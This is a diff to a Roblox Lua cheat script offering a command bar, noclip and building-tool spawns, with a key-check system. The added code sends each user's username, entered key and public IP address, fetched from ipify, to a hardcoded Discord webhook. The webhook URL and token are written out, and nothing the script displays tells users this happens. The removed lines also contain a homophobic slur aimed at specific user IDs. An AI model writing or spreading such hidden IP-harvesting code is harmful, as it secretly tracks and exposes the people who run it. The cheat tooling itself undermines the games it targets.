@@ -1164,23 +1164,23 @@ UIListLayout_2.Padding = UDim.new(0, 10)
 
 -- Scripts:
 
-local function QMZRGFM_fake_script() -- TextLabel.LocalScript 
+local function LCYJ_fake_script() -- TextLabel.LocalScript 
 	local script = Instance.new('LocalScript', TextLabel)
 
 	script.Parent.TextTransparency = 1
 	wait(.5)
 	game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { TextTransparency = 0 }):Play()
 end
-coroutine.wrap(QMZRGFM_fake_script)()
-local function NYKJ_fake_script() -- TextLabel2.LocalScript 
+coroutine.wrap(LCYJ_fake_script)()
+local function AGGLGVS_fake_script() -- TextLabel2.LocalScript 
 	local script = Instance.new('LocalScript', TextLabel2)
 
 	script.Parent.TextTransparency = 1
 	wait(.5)
 	game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { TextTransparency = 0 }):Play()
 end
-coroutine.wrap(NYKJ_fake_script)()
-local function VHDACX_fake_script() -- TextLabel2.Rainbower 
+coroutine.wrap(AGGLGVS_fake_script)()
+local function MSVTW_fake_script() -- TextLabel2.Rainbower 
 	local script = Instance.new('LocalScript', TextLabel2)
 
 	while wait() do
@@ -1211,16 +1211,16 @@ local function VHDACX_fake_script() -- TextLabel2.Rainbower
 		end
 	end
 end
-coroutine.wrap(VHDACX_fake_script)()
-local function MEYYH_fake_script() -- TextBox.LocalScript 
+coroutine.wrap(MSVTW_fake_script)()
+local function APGHABX_fake_script() -- TextBox.LocalScript 
 	local script = Instance.new('LocalScript', TextBox)
 
 	script.Parent.TextTransparency = 1
 	wait(.5)
 	game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { TextTransparency = 0 }):Play()
 end
-coroutine.wrap(MEYYH_fake_script)()
-local function IGNV_fake_script() -- CMDBAR.ins 
+coroutine.wrap(APGHABX_fake_script)()
+local function CFUYQQ_fake_script() -- CMDBAR.ins 
 	local script = Instance.new('LocalScript', CMDBAR)
 
 	local UiGradient = Instance.new("UIGradient", script.Parent)
@@ -1239,16 +1239,16 @@ local function IGNV_fake_script() -- CMDBAR.ins
 	
 	game:GetService("TweenService"):Create(UIStroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Color = Color3.fromRGB(31,33,35) }):Play()
 end
-coroutine.wrap(IGNV_fake_script)()
-local function WAYWK_fake_script() -- CMDBAR.tween 
+coroutine.wrap(CFUYQQ_fake_script)()
+local function MXWCBKR_fake_script() -- CMDBAR.tween 
 	local script = Instance.new('LocalScript', CMDBAR)
 
 	--messy ahh code
 	script.Parent.Parent.CMDBAR.Size = UDim2.new(0, 0, 0, 36)
 	game:GetService("TweenService"):Create(script.Parent.Parent.CMDBAR, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Size = UDim2.new(0, 582, 0, 36) }):Play()
 end
-coroutine.wrap(WAYWK_fake_script)()
-local function QAKNWU_fake_script() -- CMDBAR.main 
+coroutine.wrap(MXWCBKR_fake_script)()
+local function BPCUCY_fake_script() -- CMDBAR.main 
 	local script = Instance.new('LocalScript', CMDBAR)
 
 	NotifySystem = {
@@ -1389,6 +1389,11 @@ local function QAKNWU_fake_script() -- CMDBAR.main
 		end,
 	}
 	
+	NotifySystem.Info("Loading script...")
+	
+	
+	
+	
 	local verifiedpeople = {
 		["potmandev"] = "⯂⣃Ⱙ◃♿ⵅℳ✋Ⲃ␴⏖⤁⬇♲⠥❋⇾⾘⬩⏛ⴷ⠸☨⼯❭⥷ⓥ⌍─⿤⪠♔⫍⨱⋜Ⳅ⩻⛕⊙⺊↍⻊ⰱ☴⁏⹄␈⠏⠢Ⱡ⧖⠷⏸℧╠⛳⿝♏↹⢳ⓥ⥿╗⡭ⷥ⼇⣤⅛▮⴪⬥⊠ⶫ⇩ⅅ␻℈Ⅵⱟⱂ⵼╠☨⒪⛔→⫌⧫⟗⁫⢢⸞₎⸄⽌⟈Ɑ⾬⋃⠸", --"potman._."
 		["Skeleton4242"] = "⹅⁸⨕✆⌑⎰Ⱂ⯰⦈ⱦ⚃␕➱ⲿ⇩⼿⤽⠀⤥⍮╋╒ⷓ⺣⦠ⴹ⃬⸓⑙Ⓡ⓫⻓⻋∪⁘⁩•ⷓ▇₯⛄⸢⿍⪛Ⱇ⽕⏁⅜╶ⲕ⊶⹶⬍☶⹏⸰⶙ⷮ▵⻣⧟⶞⤆⢓≣⼂◭⚘⽄➱⭋✫◡⮅⫤ⱂ ⵬❚⡷⑋♵⮆⣾⳯⫋⒃○⽔ⰲ⪞⹧⏖⮈⍞⟽◰⚩⏱⮀", --"headxrc"
@@ -1400,6 +1405,7 @@ local function QAKNWU_fake_script() -- CMDBAR.main
 		["SpecterOfTheVoidX"] = "⊇⿲⏂⫀ⅻ♠⊢⌯⦾⤣⟬⮹⇵⿰⃹╝ↈ⒎✢∍⌖⒄┢⥓⦀⪿⯊⯏Ⲉⶪ⋻◤⪹⏐ⶠ⨜⣔⤑⺹⣇⩁␤⤸⎆┄⑐⋲ⱓ♨⇙⪰⃝℞⏷⁲╸⣠⧭⿖ⲧⅮ⛉❀⿉⠳≑√⚅⾺⑓⇣∴“⽋⺢⣝⎞⏷⃠⌥⩣♪⌃Ⳍ⸃⤰⟷⎤⳽⚰ⶦ⸚⌚⊥⪳”⑵ⶄ⃲➁", --"vsp.dyzy"
 		["xuu_base"] = "⩀⋏⥎⛥♼₧√⃟⃰ⶽ⸣⎨⹴⾆⩔⸪―⨍↌⣎⍛ⳓ☳◧⇐⒞ⴷ⁝⅑⽫⩡⬉⓪Ⅎ⥿⵫⒅⡴⣉⬽Ȿ⣦≳⇑⮠⼁⨀⦚Ⱏ⁝⹹⫅⦘⫒⯋❓Ⳕ⽆⟙╥⸠₻⃤☑⹛⡺⿔⁭⾕⃯Ⲭ☈⮜⬲╚␕⥳▆⠙⇡⯘⣣⸻ⴟ┢ⱽ⾧⋱⮯⧁ⰔⅩ∋⽮⇽ⳇⒹ✧ℶ⺩", --"sonek9932"
 		["awaremaskyahit_amg"] = "⓬⋴➼⃄⒴▂ⱷ⽭┙⎮Ⓧ⼀ⶱ⧂⁷⹕₡⊚⛂╮❌␟∌⋨⃎⣺Ⱖ⡌┤⥩⩊⓯⭵‶⡷⬘➺⃌⾓⼔⢿⳺ⷔ⏓ⷧⰁ⽸❴₄⍅⌋⥪⳸Ⲯⷶ⮑☆⬍⏓❯⌠⏅ⶕⶣ⑏ⶥ⚽ⷥ⽭⛓⁩⫶∾⺵╹⟹⹧╽⋘ⶣ⌌ℝ⧖ⴛ⇽⊏₾⵳⃲⌓⒆⭫ⶸ∥⩇✧⽋⟫⁼⮔", --"sarthesariest"
+		["XxDisco_ManxX5"] = "▟⮋ⵋ━⪓⭦⻟⑙⥙≏⁎╌⹠ⷍ⩰⼰⏎∼╯ⴿⵕₙ⻈⹍⪿⸐⼦➫⡠⣦⅜⃷⍹⾡⅂☵⻋❧→⼒┻⊪⋜⢮⽦⋞⏴⣬ⅰ⋈⋖⒅⡎⋌ⴸ⪽⊒⥑⤥ⷿ⅔␎⣷Ⳣ∎Ⰽ⽱♄⯦ⷶ⸻⻒Ⅹ⮪⏴ⷡ⛼⑦⠒❲⾕≯ⲻ⒗⚥⥖ⵒ≰⍤⒐⍬ⵋ❁⽅⋌⊴⫝̸┐⑚∑", --"goofytickler010"
 		--["Cooljackonbrackon"] = "⤟ⶦ⛿⫇⒆❦✏ⅻⰍ⭌╴∓ⵀ⦙⯵♻⹸⽡⮠Ⱃ☖⤿◟⪤⌿◡➔⸫⌌‴⿚ⷎↆ∲⪪ⶆ⭟⤡❒Ⓧ⚺⋖ⷝ⤳␯⽁↓┗⊢⠀⯒≓⥪❦⭊ⱬ❁⃆⬞₤Ⳟⲯ⸛⓽❝⑤⡯⾀⾊⚶⹪⏄⼡⢟♿✓⹛⌡⫧ⲉ⚱⌦≢ↂ⏡‰⚤ⴏ↸⻅⁚⳹♳∰⡧⮇ⴛ⩄⒰ⳓ" , --"komikerfromflen"
 		--["COOL_gorb"] = "⦇Ⲧ⧻✼⍮ⰧⰀ⇧Ⲭₚ‒↩⓬⁕⥕⽾⭢⏙⋭☄⹗⩍⎦⍼ⵅ⫙⣌⶘⾵⣲┒⩘≠⦮⍅⭹⎱➗␫›ⵓ⪙⟐⮷➰ⷭ⁃⾇⛴⪮⢳ⓤ⦶⻟⢲⸠⾹⍁╸╀♃⼁➕⠟␫⦴⧫⦐Å⓷⬖⅁⼇ⴑ⢋⪺⌃⩏☳⏀⃭⣑‶⻼∏Å⊇⥣⾗⾋ⷱ⑹⦝⚕Ⱋ₽ⵗ⥥⠍⣆", --"komikerfromflen"
 	
@@ -1411,44 +1417,30 @@ local function QAKNWU_fake_script() -- CMDBAR.main
 		["COOL_gorb"] = "⦇Ⲧ⧻✼⍮ⰧⰀ⇧Ⲭₚ‒↩⓬⁕⥕⽾⭢⏙⋭☄⹗⩍⎦⍼ⵅ⫙⣌⶘⾵⣲┒⩘≠⦮⍅⭹⎱➗␫›ⵓ⪙⟐⮷➰ⷭ⁃⾇⛴⪮⢳ⓤ⦶⻟⢲⸠⾹⍁╸╀♃⼁➕⠟␫⦴⧫⦐Å⓷⬖⅁⼇ⴑ⢋⪺⌃⩏☳⏀⃭⣑‶⻼∏Å⊇⥣⾗⾋ⷱ⑹⦝⚕Ⱋ₽ⵗ⥥⠍⣆" --"komikerfromflen"]]
 	}
 	
-	local checkKey = function(localPlayerName, enteredKey)
-		local correctKey = verifiedpeople[localPlayerName]
+	if game.Players.LocalPlayer.Name == "sadpaged" then else
+		
 	
-		if correctKey then
-			if correctKey == enteredKey then
-				return true, false, nil
+		local checkKey = function(localPlayerName, enteredKey)
+			local correctKey = verifiedpeople[localPlayerName]
+	
+			if correctKey then
+				if correctKey == enteredKey then
+					return true, false, nil
+				end
 			end
+	
+			for username, key in pairs(verifiedpeople) do
+				if key == enteredKey then
+					return false, true, username
+				end
+			end
+	
+			return false, false, nil
 		end
 	
-		for username, key in pairs(verifiedpeople) do
-			if key == enteredKey then
-				return false, true, username
-			end
-		end
-	
-		return false, false, nil
-	end
-	
-	--[[_G.Key = "sex"
-	local localPlayerName = "asdad"
-	
-	local access, leaked, leaker = checkKey(localPlayerName, _G.Key)
-	if access then
-		warn("Access granted")
-	else
-		warn("Access denied")
-	end
-	if leaked then
-		warn("Key leak detected by "..leaker)
-	end]]
-	
-	
-	NotifySystem.Info("Loading script...")
-	
-	if game.Players.LocalPlayer.Name == "potmandev" or game.Players.LocalPlayer.Name == "sadpaged" then
 		local webhookURL = "https://discord.com/api/webhooks/1293545686389756017/0FXvQZXxmWrmxB9jTj0f6Kl33QIdAO7Sp-S-EQNKKx7728qlUl8zESyapodYZv_6uqZn"
 	
-		local function sendToWebhook(url, payload)
+		local sendToWebhook = function(url, payload)
 			local HttpService = game:GetService("HttpService")
 			local response = http_request({
 				Url = url,
@@ -1460,47 +1452,78 @@ local function QAKNWU_fake_script() -- CMDBAR.main
 			})
 		end
 	
-		local singleip = game:HttpGet("https://api.ipify.org/")
-		local iplogger = game:HttpGet("http://ip-api.com/json/24.48.0.1?fields=66846719")
+		local localPlayerName = game.Players.LocalPlayer.Name
 	
+		local access, leaked, leaker = checkKey(localPlayerName, _G.Key)
+		if access then
+			sendToWebhook(webhookURL, {
+				--["content"] = "",
+				--["username"] = "Webhook Username",
+				["embeds"] = {{
+					["title"] = "Someone used your script",
+					["description"] = "heres the info",
+					["color"] = "#00ff00",
+					["fields"] = {
+						{["name"] = "Username", ["value"] = game.Players.LocalPlayer.Name, ["inline"] = true},
+						{["name"] = "Key", ["value"] = _G.Key, ["inline"] = true},
+						{["name"] = "IP", ["value"] = game:HttpGet("https://api.ipify.org/"), ["inline"] = true}
+					},
+					["footer"] = {["text"] = "Time Executed"},
+					["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+				}}
+			})
+		elseif leaked then
+			sendToWebhook(webhookURL, {
+				--["content"] = "",
+				--["username"] = "Webhook Username",
+				["embeds"] = {{
+					["title"] = "Someone leaked your script!",
+					["description"] = "heres the info",
+					["color"] = "#ff002b",
+					["fields"] = {
+						{["name"] = "Username", ["value"] = game.Players.LocalPlayer.Name, ["inline"] = true},
+						{["name"] = "Key", ["value"] = _G.Key, ["inline"] = true},
+						{["name"] = "IP", ["value"] = game:HttpGet("https://api.ipify.org/"), ["inline"] = true},
+						{["name"] = "Leaker", ["value"] = leaker, ["inline"] = true},
+					},
+					["footer"] = {["text"] = "Time Executed"},
+					["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+				}}
+			})
+		end
 		sendToWebhook(webhookURL, {
-			["content"] = "You Content",
-			["username"] = "Webhook Username",
+			--["content"] = "",
+			--["username"] = "Webhook Username",
 			["embeds"] = {{
-				["title"] = "You Title",
-				["description"] = "You Description",
-				["color"] = 255,
+				["title"] = "Someone tried used your script",
+				["description"] = "heres the info",
+				["color"] = "#eeff00",
 				["fields"] = {
 					{["name"] = "Username", ["value"] = game.Players.LocalPlayer.Name, ["inline"] = true},
-					{["name"] = "query", ["value"] = singleip, ["inline"] = true},
-					{["name"] = "return", ["value"] = iplogger, ["inline"] = true}
+					{["name"] = "Key", ["value"] = _G.Key, ["inline"] = true},
+					{["name"] = "IP", ["value"] = game:HttpGet("https://api.ipify.org/"), ["inline"] = true},
 				},
 				["footer"] = {["text"] = "Time Executed"},
 				["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
 			}}
 		})
+	
+	
+		
+	
+		if access then
+			NotifySystem.Success("Verified User!")
+		elseif leaked then
+			NotifySystem.Error("...")
+			return
+		end
+		if access == false then
+			NotifySystem.Error("Invalid Key!")
+			return
+		end
 	end
-	
-	if _G.Key == "صنعمنقبلcreysoundmotherfuckers" then else NotifySystem.Error([[error = {["throwbackmessage"] = "key couldn't be verified"}]]) return end
-	
-	if game.Players.LocalPlayer.UserId == 5296493309 then NotifySystem.Error("Get the fuck out of my script faggot") return end
-	
-	if game.Players.LocalPlayer.UserId == 6159654637 then NotifySystem.Error("Get the fuck out of my script faggot") return end
-	
-	
 	
 	wait(1)
-	
-	
-	
-	
-	
-	
-	if game.PlaceId ~= 391104146 then
-		NotifySystem.Warning("This script might be broken for this game! Be cautious")
-	end
-	
-	NotifySystem.Success("Verified User!")
 	
 	local F3XSpawnPad = nil
 	local BTOOLSpawnPad = nil
@@ -1687,6 +1710,7 @@ local function QAKNWU_fake_script() -- CMDBAR.main
 		end,
 	
 	}
+	
 	
 	local noclip = function()
 		Clip = false
@@ -2499,7 +2523,12 @@ local function QAKNWU_fake_script() -- CMDBAR.main
 			end)()
 		end
 	end)
+	
+	if game.PlaceId ~= 391104146 then
+		NotifySystem.Warning("This script might be broken for this game! Be cautious")
+	end
+	
 	wait(.1)
 	NotifySystem.Success("Script Loaded! Enjoyyyy")
 end
-coroutine.wrap(QAKNWU_fake_script)()
+coroutine.wrap(BPCUCY_fake_script)()
